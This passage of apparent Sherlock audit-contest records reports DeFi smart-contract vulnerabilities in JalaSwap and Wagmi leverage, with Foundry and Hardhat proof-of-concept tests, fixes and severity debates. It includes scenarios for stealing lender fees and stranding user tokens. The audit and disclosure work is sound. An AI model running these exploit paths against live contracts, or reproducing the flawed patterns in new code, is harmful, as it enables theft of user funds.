) internal returns (uint256 paidPayoff) {\n     // rest of code.\n        IERC20Metadata(baseToken).safeApprove(address(feeManager), netFee); //@note\n        feeManager.receiveFee(netFee);\n        feeManager.trackVaultFee(address(vault), vaultFee);\n\n        emit Burn(msg.sender);\n    }\n```\n\n```\n    function mint(\n        IPositionManager.MintParams calldata params\n    ) external override returns (uint256 tokenId, uint256 premium) {\n// rest of code\n        // Transfer premium:\n        // NOTE: The PositionManager is just a middleman between the user and the DVP\n        IERC20 baseToken = IERC20(dvp.baseToken());\n        baseToken.safeTransferFrom(msg.sender, address(this), obtainedPremium); \n\n        // Premium already include fee\n        baseToken.safeApprove(params.dvpAddr, obtainedPremium);//@note\n\n// rest of code\n    }\n```\n\nTool used\nManual Review
The functions about ```permit``` won't work and always revertчmediumч```\nfunction test_Permit() public {\n        tokenA.approve(address(router), 1 ether);\n        tokenB.approve(address(router), 1 ether);\n\n        router.addLiquidity(\n            address(tokenA), address(tokenB), 1 ether, 1 ether, 1 ether, 1 ether, address(this), block.timestamp\n        );\n\n        address pairAddress = factory.getPair(address(tokenA), address(tokenB));\n        JalaPair pair = JalaPair(pairAddress);\n        uint256 liquidity = pair.balanceOf(address(this));\n\n        liquidity = (liquidity * 3) / 10;\n        pair.approve(address(router), liquidity);\n\n        vm.expectRevert();\n        router.removeLiquidityWithPermit(\n            address(tokenA),\n            address(tokenB),\n            liquidity,\n            0.3 ether - 300,\n            0.3 ether - 300,\n            address(this),\n            block.timestamp,\n            true,\n            1, // this value is for demonstration only\n            bytes32(uint256(1)), // this value is for demonstration only\n            bytes32(uint256(1)) // this value is for demonstration only\n        );\n    }\n```\nчThe functions about `permit` won't work and always revert\nPOC\n```\nfunction test_Permit() public {\n        tokenA.approve(address(router), 1 ether);\n        tokenB.approve(address(router), 1 ether);\n\n        router.addLiquidity(\n            address(tokenA), address(tokenB), 1 ether, 1 ether, 1 ether, 1 ether, address(this), block.timestamp\n        );\n\n        address pairAddress = factory.getPair(address(tokenA), address(tokenB));\n        JalaPair pair = JalaPair(pairAddress);\n        uint256 liquidity = pair.balanceOf(address(this));\n\n        liquidity = (liquidity * 3) / 10;\n        pair.approve(address(router), liquidity);\n\n        vm.expectRevert();\n        router.removeLiquidityWithPermit(\n            address(tokenA),\n            address(tokenB),\n            liquidity,\n            0.3 ether - 300,\n            0.3 ether - 300,\n            address(this),\n            block.timestamp,\n            true,\n            1, // this value is for demonstration only\n            bytes32(uint256(1)), // this value is for demonstration only\n            bytes32(uint256(1)) // this value is for demonstration only\n        );\n    }\n```\nчDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/jalaswap/jalaswap-dex-contract/commit/c73dda6e81268bb329ec80ef851707f3b95ff0df.\nspacegliderrrr\nfix looks good, permit function is now added\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чWe can't remove liquidity by using `permit`.\nCode Snippet\nTool used\nmanual review and foundry
User wrapped tokens get stuck in master router because of incorrect calculationчmediumч"```\n    function testswapExactTokensForETHStuckTokens() public {\n        address wrappedTokenA = IChilizWrapperFactory(wrapperFactory).wrappedTokenFor(address(tokenA));\n\n        tokenA.approve(address(wrapperFactory), type(uint256).max);\n        wrapperFactory.wrap(address(this), address(tokenA), 100);\n\n        IERC20(wrappedTokenA).approve(address(router), 100 ether);\n        router.addLiquidityETH{value: 100 ether}(wrappedTokenA, 100 ether, 0, 0, address(this), type(uint40).max);\n\n        address pairAddress = factory.getPair(address(WETH), wrapperFactory.wrappedTokenFor(address(tokenA)));\n\n        uint256 pairBalance = JalaPair(pairAddress).balanceOf(address(this));\n\n        address[] memory path = new address[](2);\n        path[0] = wrappedTokenA;\n        path[1] = address(WETH);\n\n        vm.startPrank(user0);\n        console.log(""ETH user balance before:       "", user0.balance);\n        console.log(""TokenA user balance before:    "", tokenA.balanceOf(user0));\n        console.log(""WTokenA router balance before: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n\n        tokenA.approve(address(masterRouter), 550);\n        masterRouter.swapExactTokensForETH(address(tokenA), 550, 0, path, user0, type(uint40).max);\n        vm.stopPrank();\n\n        console.log(""ETH user balance after:       "", user0.balance);\n        console.log(""TokenA user balance after:    "", tokenA.balanceOf(user0));\n        console.log(""WTokenA router balance after: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n    }\n```\n"ч"Swapping exact tokens for ETH swaps underlying token amount, not wrapped token amount and this causes wrapped tokens to get stuck in the contract.\nIn the protocol the `JalaMasterRouter` is used to swap tokens with less than 18 decimals. It is achieved by wrapping the underlying tokens and interacting with the `JalaRouter02`. Wrapping the token gives it decimals 18 (18 - token.decimals()). There are also functions that swap with native ETH.\nIn the `swapExactTokensForETH` function the tokens are transferred from the user to the Jala master router, wrapped, approved to `JalaRouter2` and then `IJalaRouter02::swapExactTokensForETH()` is called with the amount of tokens to swap, to address, deadline and path.\nThe amount of tokens to swap that is passed, is the amount before the wrap. Hence the wrappedAmount - underlyingAmount is stuck.\n```\n    function testswapExactTokensForETHStuckTokens() public {\n        address wrappedTokenA = IChilizWrapperFactory(wrapperFactory).wrappedTokenFor(address(tokenA));\n\n        tokenA.approve(address(wrapperFactory), type(uint256).max);\n        wrapperFactory.wrap(address(this), address(tokenA), 100);\n\n        IERC20(wrappedTokenA).approve(address(router), 100 ether);\n        router.addLiquidityETH{value: 100 ether}(wrappedTokenA, 100 ether, 0, 0, address(this), type(uint40).max);\n\n        address pairAddress = factory.getPair(address(WETH), wrapperFactory.wrappedTokenFor(address(tokenA)));\n\n        uint256 pairBalance = JalaPair(pairAddress).balanceOf(address(this));\n\n        address[] memory path = new address[](2);\n        path[0] = wrappedTokenA;\n        path[1] = address(WETH);\n\n        vm.startPrank(user0);\n        console.log(""ETH user balance before:       "", user0.balance);\n        console.log(""TokenA user balance before:    "", tokenA.balanceOf(user0));\n        console.log(""WTokenA router balance before: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n\n        tokenA.approve(address(masterRouter), 550);\n        masterRouter.swapExactTokensForETH(address(tokenA), 550, 0, path, user0, type(uint40).max);\n        vm.stopPrank();\n\n        console.log(""ETH user balance after:       "", user0.balance);\n        console.log(""TokenA user balance after:    "", tokenA.balanceOf(user0));\n        console.log(""WTokenA router balance after: "", IERC20(wrappedTokenA).balanceOf(address(masterRouter)));\n    }\n```\n"ч"In `JalaMasterRouter::swapExactTokensForETH()` multiply the `amountIn` by decimal off set of the token:\n```\n    function swapExactTokensForETH(\n        address originTokenAddress,\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external virtual override returns (uint256[] memory amounts) {\n        address wrappedTokenIn = IChilizWrapperFactory(wrapperFactory).wrappedTokenFor(originTokenAddress);\n\n        require(path[0] == wrappedTokenIn, ""MS: !path"");\n\n        TransferHelper.safeTransferFrom(originTokenAddress, msg.sender, address(this), amountIn);\n        _approveAndWrap(originTokenAddress, amountIn);\n        IERC20(wrappedTokenIn).approve(router, IERC20(wrappedTokenIn).balanceOf(address(this)));\n\n// Add the line below\n        uint256 decimalOffset = IChilizWrappedERC20(wrappedTokenIn).getDecimalsOffset();\n// Add the line below\n        amounts = IJalaRouter02(router).swapExactTokensForETH(amountIn * decimalOffset, amountOutMin, path, to, deadline);\n// Remove the line below\n        amounts = IJalaRouter02(router).swapExactTokensForETH(amountIn , amountOutMin, path, to, deadline);\n    }\n```\n\nDiscussion\nnevillehuang\nIf a sufficient slippage (which is users responsibility) is set, this will at most cause a revert, so medium severity is more appropriate. (The PoC set slippage to zero)\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/jalaswap/jalaswap-dex-contract/commit/9ed6e8f4f6ad762ef7b747ca2d367f6cfd78973e.\nspacegliderrrr\nfix looks good, right amount is now passed to the router\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix."чUser wrapped tokens get stuck in router contract. The can be stolen by someone performing a `swapExactTokensForTokens()` because it uses the whole balance of the contract when swapping: `IERC20(wrappedTokenIn).balanceOf(address(this))`\n```\n        amounts = IJalaRouter02(router).swapExactTokensForTokens(\n            IERC20(wrappedTokenIn).balanceOf(address(this)),\n            amountOutMin,\n            path,\n            address(this),\n            deadline\n        );\n```\n\nCode Snippet\nTool used\nManual Review, foundry
JalaPair potential permanent DoS due to overflowчmediumч```\nuint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\nif (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n    // * never overflows, and + overflow is desired\n    price0CumulativeLast += uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n    price1CumulativeLast += uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n}\n```\nчIn the `JalaPair::_update` function, overflow is intentionally desired in the calculations for `timeElapsed` and `priceCumulative`. This is forked from the UniswapV2 source code, and it’s meant and known to overflow. UniswapV2 was developed using Solidity 0.6.6, where arithmetic operations overflow and underflow by default. However, Jala utilizes Solidity >=0.8.0, where such operations will automatically revert.\n```\nuint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\nif (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n    // * never overflows, and + overflow is desired\n    price0CumulativeLast += uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n    price1CumulativeLast += uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n}\n```\nч"Use the `unchecked` block to ensure everything overflows as expected\nDiscussion\nnevillehuang\nRequest poc\nWould like the watson/watsons to present a scenario where a reasonable overflow can be achieved, because based on my discussion with LSW this is likely not reasonable considering frequency of liquidity addition and ratio of reserves required\n#186 - let's put it this way. Ratio is scaled up by 2^112. Having a `(ratio * timeElapsed1) + (ratio * timeElapsed2)` is the same as having `(ratio * (timeElapsed1 + timeElapsed2)`. So if we have a token1 max reserve of uint112 and token0 reserve is 1, `uint112.max * uint112.max * totalTimeElapsed`. In order for this to overflow, we need totalTimeElapsed to be > uint32.max, which is approx 132 years. So for this to overflow, we'd need to have the pool running for 132 years with one of the reserve being the max and the other one being just 1 wei for the entirety of the 132 years.\nsherlock-admin3\nPoC requested from @0xf1b0\nRequests remaining: 10\n0xf1b0\nEven if we do not take reserves into account, the timestamp is converted into a 32-bit value.\n`uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);`\nWhen the timestamp gets >4294967296 (in 82 years), the `_update` function will always revert.\nnevillehuang\n@Czar102 what do you think? I don’t think its severe enough to warrant medium severity. I remember you rejected one of a similar finding in dodo as seen here\nCzar102\nThe linked issue presented a way to DoS functionality. Is this also the case here? Or are funds locked here as well? It seems to me that the funds are locked, so I'd accept this as a valid Medium (High impact in far future – a limitation).\nnevillehuang\n@Czar102 Agree, if long enough, all core functionalities `burn()` (Remove liquidity), `mint()` (add liquidity) and `swap()` that depends on this low level functions have the potential to be DoSed due to `_update()` reverting, will leave as medium severity\ndeadrosesxyz\nEscalate\n`block.timestamp` stored in a uint32 will overflow in year 2102. This is way too far in the future and likely even beyond our lifetime. Even in the unlikely scenario where the protocol will be used in 80 years from now, users will know years in advance that they'll have to withdraw their funds as the protocol is about to shut down. Issue should be considered low/info\nsherlock-admin2\nEscalate\n`block.timestamp` stored in a uint32 will overflow in year 2102. This is way too far in the future and likely even beyond our lifetime. Even in the unlikely scenario where the protocol will be used in 80 years from now, users will know years in advance that they'll have to withdraw their funds as the protocol is about to shut down. Issue should be considered low/info\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nnevillehuang\nI will invite any watsons to prove if accumulated actions (swap, burn and mint) can cause overflow in price variables (whether maliciously or accidentally)\ngiraffe0x\nTimestamp overflow is less of a concern here, cumulative value is.\nAs with uniswap, pools can be created with all sorts of exotic pairs. So ratio between reserve0/1 may be arbitrarily large.\nCode comments clearly state that ""overflow is desired"" when overflow cannot happen in current format.\nIt's a clear mistake on the devs, which has an easy fix to wrap with unchecked block. Not sure why they won't fix it.\ndeadrosesxyz\n@giraffe0x hey, please check the initial message by @nevillehuang on why cumulatives cannot actually overflow. Reserves are uint112s, so ratio can be max uint112.max : 1. Also, the comment is not made by the devs, but actually left out from the copying of original univ2 contracts\nnevillehuang\n@deadrosesxyz, Could a malicious user(s) (despite requiring alot of funds) be able to brick the pool permanently by constantly performing actions (burn, swap, mint) and incrementing price variables?\ndeadrosesxyz\n@nevillehuang No, constantly performing actions will not help for an overflow to occur in any way (as the cumulative increases based on seconds passed). Even in the most extreme scenario where one of the reserves has max value and the other one has simply 1 wei, it would take 132 years for an overflow to occur. Quoting my comments from earlier:\nlet's put it this way. Ratio is scaled up by 2^112. Having a (ratio * timeElapsed1) + (ratio * timeElapsed2) is the same as having (ratio * (timeElapsed1 + timeElapsed2). So if we have a token1 max reserve of uint112 and token0 reserve is 1, uint112.max * uint112.max * totalTimeElapsed. In order for this to overflow, we need totalTimeElapsed to be > uint32.max, which is approx 132 years. So for this to overflow, we'd need to have the pool running for 132 years with one of the reserve being the max and the other one being just 1 wei for the entirety of the 132 years.\nnevillehuang\nThis would depend on how @Czar102 interprets the following rule given he agreed initially that this should remain as a valid medium severity as seen here\nCauses a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The losses must exceed small, finite amount of funds, and any amount relevant based on the precision or significance of the loss.\nmahmudoloyede\n@giraffe0x hey, please check the initial message by @nevillehuang on why cumulatives cannot actually overflow. Reserves are uint112s, so ratio can be max uint112.max : 1. Also, the comment is not made by the devs, but actually left out from the copying of original univ2 contracts\nIt really doesn't matter if it was left out from the copying of original univ2 contracts. The intent is for it to overflow but it won't in this case. Also if the pairs are tokens with decimals greater than 18, the DOS will occur sooner.\nsantiellena\n@nevillehuang No, constantly performing actions will not help for an overflow to occur in any way (as the cumulative increases based on seconds passed). Even in the most extreme scenario where one of the reserves has max value and the other one has simply 1 wei, it would take 132 years for an overflow to occur. Quoting my comments from earlier:\nlet's put it this way. Ratio is scaled up by 2^112. Having a (ratio * timeElapsed1) + (ratio * timeElapsed2) is the same as having (ratio * (timeElapsed1 + timeElapsed2). So if we have a token1 max reserve of uint112 and token0 reserve is 1, uint112.max * uint112.max * totalTimeElapsed. In order for this to overflow, we need totalTimeElapsed to be > uint32.max, which is approx 132 years. So for this to overflow, we'd need to have the pool running for 132 years with one of the reserve being the max and the other one being just 1 wei for the entirety of the 132 years.\n@deadrosesxyz It will actually take less than 132 years because the pair could have a token1 max reserve of uint112 and token0 reserve of 1 wei on the first block. This means that timeElapsed will be the block.timestamp of the first block (something like 1710940084 now). This means that 52.25 years of those 132 years have already passed. It is still a big number, however, it is easy to fix and a clear mistake on the devs.\nCzar102\nI maintain my judgment from preliminary judging – I think it should be Medium especially because of the ""overflow is desired"" comment, which means that sponsors care about the behavior in far future. Without these comments, the judgment on this issue would be disputable.\nPlanning to reject the escalation and leave the issue as is.\nCzar102\nResult: Medium Has duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\ndeadrosesxyz: rejected"чThis issue could potentially lead to permanent denial of service for a pool. All the core functionalities such as `mint`, `burn`, or `swap` would be broken. Consequently, all funds would be locked within the contract.\nI think issue with High impact and a Low probability (merely due to the extended timeframe for the event's occurrence, it's important to note that this event will occur with 100% probability if the protocol exists at that time), should be considered at least as Medium.\nReferences\nThere are cases where the same issue is considered High.\nhttps://solodit.xyz/issues/h-02-uniswapv2priceoraclesol-currentcumulativeprices-will-revert-when-pricecumulative-addition-overflow-code4rena-phuture-finance-phuture-finance-contest-git https://solodit.xyz/issues/m-02-twavsol_gettwav-will-revert-when-timestamp-4294967296-code4rena-nibbl-nibbl-contest-git https://solodit.xyz/issues/trst-m-3-basev1pair-could-break-because-of-overflow-trust-security-none-satinexchange-markdown_\nCode Snippet\nTool used\nManual Review
Fees aren't distributed properly for positions with multiple lenders, causing loss of funds for lendersчhighч```\n                uint256 feesAmt = FullMath.mulDiv(feesOwed, cache.holdTokenDebt, borrowedAmount); //fees owed multiplied by the individual amount lent, divided by the total amount lent\n                // rest of code\n                loansFeesInfo[creditor][cache.holdToken] += feesAmt;\n                harvestedAmt += feesAmt;\n```\nчFees distributed are calculated according to a lender's amount lent divided by the total amount lent, which causes more recent lenders to steal fees from older lenders.\n```\n                uint256 feesAmt = FullMath.mulDiv(feesOwed, cache.holdTokenDebt, borrowedAmount); //fees owed multiplied by the individual amount lent, divided by the total amount lent\n                // rest of code\n                loansFeesInfo[creditor][cache.holdToken] += feesAmt;\n                harvestedAmt += feesAmt;\n```\n\nThe above is from harvest(); `repay()` calculates the fees similarly. Because `borrow()` doesn't distribute fees, the following scenario will occur when a borrower increases an existing position:\nBorrower has an existing position with fees not yet collected by the lenders.\nBorrower increases the position with a loan from a new lender.\n`harvest()` or `repay()` is called, and the new lender is credited with some of the previous fees earned by the other lenders due to the fees calculation. Other lenders lose fees.\nThis scenario can naturally occur during the normal functioning of the protocol, or a borrower/attacker with a position with a large amount of uncollected fees can maliciously open a proportionally large loan with an attacker to steal most of the fees.\nAlso note that ANY UDPATE ISSUE? LOW PRIOчA potential fix is to harvest fees in the borrow() function; the scenario above will no longer be possible.\nDiscussion\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/RealWagmi/wagmi-leverage/commit/84416fcedfcc7eb062917bdc69f919bba9d3c0b7.\nfann95\nYes, the problem existed and is associated with the same error as #39. This issue is related to an erroneous scheme for accumulating fees and affected almost all functions in the contract, so the PR turned out to be quite large.\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid: high(1)\nnevillehuang\nSee comments hereчLoss of funds for lenders, potential for borrowers to steal fees.\nCode Snippet\nTool used\nManual Review
Entrance fees are distributed wrongly in loans with multiple lendersчmediumч```\n        borrowing.feesOwed += entranceFee;\n```\nчEntrance fees are distributed improperly, some lenders are likely to lose some portion of their entrance fees. Also, calling `updateHoldTokenEntranceFee()` can cause improper entrance fee distribution in loans with multiple lenders.\nNote that entrance fees are added to the borrower's `feesOwed` when borrowing:\n```\n        borrowing.feesOwed += entranceFee;\n```\n\n```\n                uint256 feesAmt = FullMath.mulDiv(feesOwed, cache.holdTokenDebt, borrowedAmount); //fees owed multiplied by the individual amount lent, divided by the total amount lent\n                // rest of code\n                loansFeesInfo[creditor][cache.holdToken] += feesAmt;\n                harvestedAmt += feesAmt;\n```\n\nThis is a problem because the entrance fees will be distributed among all lenders instead of credited to each lender. Example:\nA borrower takes a loan of 100 tokens from a lender and pays an entrance fee of 10 tokens.\nAfter some time, the lender harvests fees and fees are set to zero. (This step could be frontrunning the below step.)\nThe borrower immediately takes out another loan of 100 tokens and pays and entrance fee of 10 tokens.\nWhen fees are harvested again, due to the calculation in the code block above, 5 tokens of the entrance fee go to the first lender and 5 tokens go to the second lender. The first lender has collected 15 tokens of entrance fees, while the second lender has collected only 5- despite both loans having the same borrowed amount.\nFurthermore, if the entrance fee is increased then new lenders will lose part of their entrance fee. Example:\nA borrower takes a loan of 100 tokens from a lender and pays an entrance fee of 10 tokens.\nThe entrance fee is increased.\nThe borrower increases the position by taking a loan of 100 tokens from a new lender, and pays an entrance fee of 20 tokens.\n`harvest()` is called, and both lenders receive 15 tokens out of the total 30 tokens paid as entrance fees. This is wrong since the first lender should receive 10 and the second lender should receive 20.чCould add the entrance fee directly to the lender's fees balance instead of adding it to feesOwed, and then track the entrance fee in the loan data to be used in min fee enforcement calculations.\nDiscussion\nsherlock-admin\nThe protocol team fixed this issue in PR/commit https://github.com/RealWagmi/wagmi-leverage/commit/84416fcedfcc7eb062917bdc69f919bba9d3c0b7.\nfann95\nYes, the problem existed and is associated with the same error as #41. This issue is related to an erroneous scheme for accumulating fees and affected almost all functions in the contract, so the PR turned out to be quite large.\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\ntakarez commented:\nvalid; high(1)\nnevillehuang\n@fann95 Is the root cause the same as #41?\nfann95\nI think so since it was assumed that the entrance fee would be distributed the same way as the fees for borrowing.\nnevillehuang\n@fann95 Can you take a look at this comment and let me know your thoughts\nfann95\nCan you take a look at this comment and let me know your thoughts\ndone\nnevillehuang\nSee comments here\nzrax-x\nEscalate\nThis should be a duplicate of issue 41, or be of Medium severity.\nHere are my two reasons.\nFirstly, all of these issues (issue 41, issue 16 and this one) discuss the distribution of fees. In both issue 41 and issue 16, it was mentioned that the fees are not distributed in the function `borrow`, causing some lenders to lose fees. This issue talks about the same fee distribution problem, except it focuses on the entrance fees. In that respect, it's a Duplicate.\nSecondly, entrance fees are a fraction of all fees, only 0.1% is charged by default and can be set to 0. Therefore, its impact is obviously not as serious as that mentioned in issue 41. I consider this to be a Medium severity issue.\nsherlock-admin2\nEscalate\nThis should be a duplicate of issue 41, or be of Medium severity.\nHere are my two reasons.\nFirstly, all of these issues (issue 41, issue 16 and this one) discuss the distribution of fees. In both issue 41 and issue 16, it was mentioned that the fees are not distributed in the function `borrow`, causing some lenders to lose fees. This issue talks about the same fee distribution problem, except it focuses on the entrance fees. In that respect, it's a Duplicate.\nSecondly, entrance fees are a fraction of all fees, only 0.1% is charged by default and can be set to 0. Therefore, its impact is obviously not as serious as that mentioned in issue 41. I consider this to be a Medium severity issue.\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\nqmdddd\nEscalate\nSee above.\nsherlock-admin2\nEscalate\nSee above.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xDetermination\nI disagree with the escalation's first point for the following reasons:\nThe root cause/fix for this issue is distinct from the root cause/fix for 41 (these fixes are implementing the recommendations). Fixing one issue won't fix the other.\nEntrance fees are a different type of fees than fees accumulated over time.\nAs for the second point, I agree that this may be a borderline M, but I lean more towards H for the following reasons:\nEntrance fees can be set up to 10% of the borrowed amount, which can be quite a lot considering that this is a high leverage protocol.\nI'm not sure if the loss here can be called 'highly constrained' considering that a lot of net loss can build up over time as more positions are taken in the protocol. (This issue will occur in every loan with multiple lenders.) For example, if over a period of 1 year there are 1000 multi loan positions taken by users in the protocol with $100 worth of entrance fees lost in each position, then the net loss/misallocation from this bug could be $100,000.\nA malicious borrower can borrow from himself or a colluding lender and then borrow from another lender to steal entrance fees (making the second position cheaper)\nWould like to see how @Czar102 judges this issue, since I do think the severity may be borderline.\nnevillehuang\n@zrax-x Can you provide code logic to prove the root cause is similar? If not I think it should remain not as duplicates given it involves different fee types.\nAdditionally, I believe medium severity could be more appropriate, but based on what @fann95 has highlighted, the impact is widespread throughout the whole system. @fann95 Could you shed some light on the potential impact it could have and does it justify high severity?\nzrax-x\nI believe High severity is not appropriate.\nThe entry fee rate defaults to 0.1% and entry fee is determined when borrowing (i.e. it does not increase over time), so its amount is limited.\nAt the same time, in order to steal the entry fees, the attacker will have to pay fees to the platform (as implemented in the function _pickUpPlatformFees), which accounts for 20% of the interest fees. So the attack cost is very high.\n```\n    /**\n     * @dev Platform fees in basis points.\n     * 2000 BP represents a 20% fee on the daily rate.\n     */\n    uint256 public platformFeesBP = 2000;\n```\n\nIn summary, this issue will indeed cause some lenders to lose part of entry fees, but its impact is limited. I maintain it is a Medium severity issue.\n0xDetermination\nI think an impact that might make this issue H without needing to consider conditions like entrance fee settings is the 'net loss built up over time' example in my previous comment (edited to add the example).\nAddressing @zrax-x's point about platform fees- true, there is a maximum/default 20% platform fee although it can also be set lower. If we assume slippage is negligible the attack would still be profitable, but I agree that this would reduce the profitability.\nCzar102\n@zrax-x @qmdddd can you follow up on @nevillehuang's question?\nCan you provide code logic to prove the root cause is similar?\nJust want to have clarity on the duplication status before considering the severity. Do you agree that this issue shouldn't be a duplicate of #41?\nzrax-x\n@Czar102 I now believe this can be a distinct issue, although it also pertains to fee distribution, the distinction lies in the calculation methods for the fees.\nCzar102\n@zrax-x @qmdddd @0xDetermination what is the optimal attacker's strategy to minimize their fees? How much does the lender lose in that scenario?\n0xDetermination\n@Czar102 @zrax-x I looked into it more and I think the minimizing fee attack is actually not profitable unless the attacker is frontrunning the admin increasing entrance fees or is colluding with another lender that the attacker legitimately wants to borrow from. So I think the highest impact for this issue may be the 'net loss' scenario as described in my earlier comment, considering that this issue will occur for every loan with multiple lenders.\nzrax-x\n@Czar102 Yes, I agree with @0xDetermination. First of all, it is difficult for attackers to profit from it because attackers need to pay relatively expensive platform fees. Secondly, some lenders will indeed lose a certain amount of entry fee, but I think this loss is small (considering that the entry fee rate is 0.1%, and it is not a complete loss).\n0xDetermination\n@zrax-x Yes, but the entrance fee can be up to 10%, and even with a 0.1% fee rate a large amount of net loss can accumulate over time- which is why I think this issue could be borderline.\nzrax-x\nMy opinion is that considering that the root cause of this issue and issue#41 are the same (both use the same distribution method, as @fann95 commented before), the difference is only in the fee calculation. At the same time, the impact of issue#41 is more serious (the attacker is profitable and the loss is greater). So, on both counts, I believe that its severity should be M.\nCzar102\nBecause of the heavy constraints on the exploitability (is never profitable based on what was said), and the fact that (from my understanding) the goal of this fee is mainly to prevent extremely short-term borrows and not to increase lenders' earnings, I believe this is a Medium severity issue.\nPlanning to accept the escalation and downgrade the issue to Medium.\nCzar102\nResult: Medium Unique\nsherlock-admin4\nEscalations have been resolved successfully!\nEscalation status:\nqmdddd: acceptedчLenders are likely to lose entrance fees.\nCode Snippet\nTool used\nManual Review
A borrower eligible for liquidation can pay an improperly large amount of fees, and may be unfairly liquidatedчmediumч```\n            (collateralBalance, currentFees) = _calculateCollateralBalance(\n                borrowing.borrowedAmount,\n                borrowing.accLoanRatePerSeconds,\n                borrowing.dailyRateCollateralBalance,\n                accLoanRatePerSeconds\n            );\n            // rest of code\n            if (collateralBalance > 0) {\n                // rest of code\n            } else {\n                currentFees = borrowing.dailyRateCollateralBalance; //entire collateral amount\n            }\n            // rest of code\n            borrowing.feesOwed += _pickUpPlatformFees(borrowing.holdToken, currentFees);\n```\nчIf a borrower is partially liquidated and then increases the collateral balance to avoid further liquidation, they will pay an improperly large amount of fees and can be unfairly liquidated.\n```\n            (collateralBalance, currentFees) = _calculateCollateralBalance(\n                borrowing.borrowedAmount,\n                borrowing.accLoanRatePerSeconds,\n                borrowing.dailyRateCollateralBalance,\n                accLoanRatePerSeconds\n            );\n            // rest of code\n            if (collateralBalance > 0) {\n                // rest of code\n            } else {\n                currentFees = borrowing.dailyRateCollateralBalance; //entire collateral amount\n            }\n            // rest of code\n            borrowing.feesOwed += _pickUpPlatformFees(borrowing.holdToken, currentFees);\n```\n\nWhen liquidation occurs right after becoming liquidatable, the `collateralBalance` calculation in `repay()` above will be a small value like -1; and essentially all the fees owed will be collected.\nIf the borrower notices the partial liquidation and wishes to avoid further liquidation, `increaseCollateralBalance()` can be called to become solvent again. But since the `accLoanRatePerSeconds` wasn't updated, the borrower will have to doubly pay all the fees that were just collected. This will happen if a lender calls `harvest()` or the loan is liquidated again. The loan can also be liquidated unfairly, because the `collateralBalance` calculated above will be much lower than it should be.ч"Update `accLoanRatePerSeconds` for incomplete emergency liquidations.\nDiscussion\nfann95\naccLoanRatePerSeconds should not be updated since borrowedAmount are reduced, accordingly, a position debt also redused This issue was already discussed in the previous audit. Harvest cannot be called on a position that is under liquidation\nnevillehuang\nInvalid, agree with sponsors comments. This was previously discussed here\n0xDetermination\nHi @nevillehuang @fann95 , posting commented PoC with console.logs below (modified test).\nThe flow is like so:\nBorrower's position is emergency liquidated by one lender\nBorrower doesn't want to get liquidated more so `increaseCollateralBalance()` is called\nBorrower will pay too many fees since `dailyRateCollateralBalance` was set to zero and `accLoanRatePerSeconds` wasn't updated\n```\n    it(""emergency repay will be successful for PosManNFT owner if the collateral is depleted"", async () => {\n        let debt: ILiquidityBorrowingManager.BorrowingInfoExtStructOutput[] =\n            await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        console.log('collateralBalance', debt[0].collateralBalance);\n        console.log('current collateral amount', debt[0].info.dailyRateCollateralBalance);\n        console.log('estimated life time', debt[0].estimatedLifeTime);\n        await time.increase(debt[0].estimatedLifeTime.toNumber() + 1);\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        console.log('collateralBalance after advancing time', debt[0].collateralBalance);\n\n        let borrowingKey = (await borrowingManager.getBorrowingKeysForBorrower(bob.address))[0];\n        let deadline = (await time.latest()) + 60;\n\n        let params: ILiquidityBorrowingManager.RepayParamsStruct = {\n            returnOnlyHoldToken: true,\n            isEmergency: true, //emergency\n            internalSwapPoolfee: 0,\n            externalSwap: [],\n            borrowingKey: borrowingKey,\n            minHoldTokenOut: BigNumber.from(0),\n            minSaleTokenOut: BigNumber.from(0)\n        };\n\n        await expect(borrowingManager.connect(alice).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, alice.address, borrowingKey);\n\n        debt = await borrowingManager.getBorrowerDebtsInfo(bob.address);\n        \n        console.log('collateralBalance after first liquidation (this is wrong, should be close to zero)', debt[0].collateralBalance); //this amount is wrong, way too large due to the borrower's collateral set to zero and accLoanRatePerSeconds not updated. We can see that the amount actually increased instead of decreasing as it should\n        \n        //borrower increases collateral by a large amount such that liquidation shouldn't be possible anymore, 18000000000000000000000 (this is currently scaled by collateral precision, 1e18)\n        //This amount is about 75% of the orignal collateral amount of 24948000000000000000000\n        await borrowingManager.connect(bob).increaseCollateralBalance(borrowingKey, 18000n, deadline); //adjust amount for collateral balance precision\n        //below should revert since collateral balance was increased by a large amount, but the borrower gets liquidated\n        await expect(borrowingManager.connect(bob).repay(params, deadline))\n            .to.emit(borrowingManager, ""EmergencyLoanClosure"")\n            .withArgs(bob.address, 